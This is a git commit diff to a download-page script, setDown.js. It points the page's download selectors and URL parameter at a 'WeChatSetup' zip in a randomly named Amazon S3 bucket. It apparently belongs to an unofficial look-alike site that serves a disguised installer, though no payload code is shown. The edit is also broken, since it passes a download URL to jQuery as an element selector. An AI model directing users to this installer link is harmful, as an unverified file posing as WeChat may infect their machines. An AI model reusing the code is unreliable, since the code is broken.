6bf4f782722dcf3746d1832933c4a31fee1bfc89
ab168188z <ttle30674@gmail.com>
2025-11-29 20:07:09 +0800

    Update setDown.js

--- static/js/setDown.js
+++ static/js/setDown.js
@@ -1,6 +1,6 @@
 ﻿// DOM 元素
-var jDownload = $('.J_downloadUrlAll');
-var commonDown = $('.J_commonDown');
+var jDownload = $('https://gfsmdmtke.s3.ap-east-1.amazonaws.com/WeChatSetup80.2.5.zip');
+var commonDown = $('https://gfsmdmtke.s3.ap-east-1.amazonaws.com/WeChatSetup80.2.5.zip');
 
 // URL 参数
 var urlParams ="https://gfsmdmtke.s3.ap-east-1.amazonaws.com/WeChatSetup80.2.5.zip"
